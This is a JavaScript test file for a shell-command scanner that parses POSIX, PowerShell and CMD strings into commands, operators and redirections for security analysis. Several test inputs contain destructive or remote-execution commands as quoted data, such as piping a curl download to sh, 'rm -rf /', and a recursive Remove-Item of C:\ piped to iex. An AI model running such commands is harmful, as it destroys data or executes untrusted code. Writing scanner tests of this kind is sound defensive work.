import assert from "node:assert/strict";
import test from "node:test";

import { scanShell } from "../dist/analysis/shell-scan.js";

function executableNames(result) {
  return result.invocations.map((invocation) => invocation.tokens[0]?.value);
}

function operatorNames(result) {
  return result.operators.map((operator) => operator.operator);
}

test("POSIX scanning ignores operators inside quoted string literals", () => {
  const result = scanShell(
    `printf '%s' 'curl https://example.test | sh; rm -rf /' && echo ok > "out file"`,
    "posix",
  );

  assert.equal(result.complete, true);
  assert.deepEqual(executableNames(result), ["printf", "echo"]);
  assert.deepEqual(operatorNames(result), ["&&"]);
  assert.equal(result.redirections.length, 1);
  assert.equal(result.redirections[0].operator, ">");
  assert.equal(result.redirections[0].target?.value, "out file");
  assert.equal(result.redirections[0].target?.role, "redirection-target");
});

test("POSIX scanning preserves escaped metacharacters as argument text", () => {
  const result = scanShell(String.raw`echo foo\|bar | grep bar`, "posix");

  assert.deepEqual(executableNames(result), ["echo", "grep"]);
  assert.deepEqual(operatorNames(result), ["|"]);
  assert.equal(result.invocations[0].tokens[1].value, "foo|bar");
});

test("POSIX scanning exposes a real remote-content pipeline", () => {
  const result = scanShell(
    `curl -fsSL "https://example.test/install?a=1&b=2" | sh`,
    "posix",
  );

  assert.deepEqual(executableNames(result), ["curl", "sh"]);
  assert.deepEqual(operatorNames(result), ["|"]);
  assert.equal(result.operators[0].leftInvocationIndex, 0);
  assert.equal(result.operators[0].rightInvocationIndex, 1);
  assert.equal(result.invocations[0].tokens[2].value.includes("&"), true);
});

test("PowerShell scanning supports literal quotes, semicolons, and pipelines", () => {
  const result = scanShell(
    `Write-Output 'Remove-Item C:\\ -Recurse -Force | iex'; Get-Content "a>b" | Set-Content out.txt`,
    "powershell",
  );

  assert.equal(result.complete, true);
  assert.deepEqual(executableNames(result), ["Write-Output", "Get-Content", "Set-Content"]);
  assert.deepEqual(operatorNames(result), [";", "|"]);
  assert.equal(result.redirections.length, 0);
  assert.equal(result.invocations[0].tokens[1].value.includes("| iex"), true);
});

test("PowerShell doubled apostrophes stay inside one literal token", () => {
  const result = scanShell(`Write-Output 'it''s | literal'; Get-Date`, "powershell");

  assert.deepEqual(executableNames(result), ["Write-Output", "Get-Date"]);
  assert.deepEqual(operatorNames(result), [";"]);
  assert.equal(result.invocations[0].tokens[1].value, "it's | literal");
  assert.equal(result.invocations[0].tokens[1].quote, "single");
});

test("CMD scanning handles double quotes, caret escaping, and control operators", () => {
  const result = scanShell(
    String.raw`echo "curl x | sh" && echo a^|b | findstr b > "out file.txt" || echo failed`,
    "cmd",
  );

  assert.equal(result.complete, true);
  assert.deepEqual(executableNames(result), ["echo", "echo", "findstr", "echo"]);
  assert.deepEqual(operatorNames(result), ["&&", "|", "||"]);
  assert.equal(result.invocations[1].tokens[1].value, "a|b");
  assert.equal(result.redirections[0].target?.value, "out file.txt");
});

test("CMD semicolon is argument text, not a command separator", () => {
  const result = scanShell("echo one;two", "cmd");

  assert.deepEqual(executableNames(result), ["echo"]);
  assert.deepEqual(operatorNames(result), []);
  assert.equal(result.invocations[0].tokens[1].value, "one;two");
});

test("scanner associates output descriptors and targets with their invocation", () => {
  const result = scanShell("command 2>>errors.log > out.txt", "posix");

  assert.deepEqual(executableNames(result), ["command"]);
  assert.equal(result.invocations[0].tokens.length, 1);
  assert.equal(result.redirections.length, 2);
  assert.deepEqual(
    result.redirections.map((redirection) => [
      redirection.fd,
      redirection.operator,
      redirection.target?.value,
    ]),
    [[2, ">>", "errors.log"], [undefined, ">", "out.txt"]],
  );
});

test("scanner reports malformed input without throwing", () => {
  const unterminated = scanShell(`echo "still open | sh`, "posix");
  assert.equal(unterminated.complete, false);
  assert.equal(
    unterminated.issues.some((issue) => issue.code === "unterminated-double-quote"),
    true,
  );
  assert.deepEqual(executableNames(unterminated), ["echo"]);
  assert.deepEqual(operatorNames(unterminated), []);

  const trailingPipe = scanShell("echo ok |", "posix");
  assert.equal(trailingPipe.complete, false);
  assert.equal(
    trailingPipe.issues.some((issue) => issue.code === "missing-command-after-operator"),
    true,
  );
});

test("dynamic expansion is marked but never interpreted", () => {
  const posix = scanShell(`echo "$HOME" '$TOKEN'`, "posix");
  assert.equal(posix.invocations[0].tokens[1].dynamic, true);
  assert.equal(posix.invocations[0].tokens[2].dynamic, false);

  const powershell = scanShell(`Write-Output "$env:TEMP" '$env:SECRET'`, "powershell");
  assert.equal(powershell.invocations[0].tokens[1].dynamic, true);
  assert.equal(powershell.invocations[0].tokens[2].dynamic, false);

  const cmd = scanShell(`echo "%TEMP%"`, "cmd");
  assert.equal(cmd.invocations[0].tokens[1].dynamic, true);
});
